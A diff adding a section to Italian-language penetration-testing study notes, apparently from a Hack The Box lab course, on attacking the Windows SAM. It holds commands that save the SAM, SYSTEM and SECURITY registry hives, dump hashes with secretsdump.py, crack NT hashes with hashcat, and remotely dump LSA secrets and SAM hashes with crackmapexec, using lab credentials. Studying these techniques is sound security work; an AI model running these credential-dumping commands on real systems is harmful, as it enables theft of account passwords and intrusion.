@@ -180,5 +180,50 @@ Attaccare un servizio bruteforzando le default password si dice Credential Stuff
 
 COnsidera che user_pass.list deve avere la sintassi **username:password**
 
+# Attacking SAM
 
+## Copying SAM Registry Hives
+
+Registry Hives interessanti che possiamo leggere se siamo local admin
+
+- hklm\sam	Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext.
+- hklm\system	Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.
+- hklm\security	Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.
+
+### COpiarli con reg.exe
+```
+C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save
+
+The operation completed successfully.
+
+C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save
+
+The operation completed successfully.
+
+C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save
+
+The operation completed successfully.
+```
+
+### Dumping hashes with secretsdump.py
+`python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL`
+
+La prima cosa che fa secretsdump.py e' andare a vedere nella reg key **system**  per cercare la system bootkey con la quale SAM e' criptato. Percio' dobbiamo dargli tutti e 3 i file.
+
+QUesto e' il formato dell' hash: **Dumping local SAM hashes (uid:rid:lmhash:nthash)**
+
+### Usare Hashcat per crackare hash NT
+`j4k1dibe@htb[/htb]$ sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt` -m 1000 e' il formato NTLM based hashes.
+
+## Remote dumping & LSA Secrets Considerations
+
+Con accesso alle credenziali da local admin e' possibile targettare **LSA Secrets** tramite network.
+
+Questo ci permette di estrarre credenziali da un servizio in esecuzione, una scheduled task o applicazioni che usano LSA Secrets per salvare le password
+
+### Dumping LSA Secrets remotely
+`j4k1dibe@htb[/htb]$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa`
+
+### Dumping SAM hashes Remotely
+`j4k1dibe@htb[/htb]$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam`
 
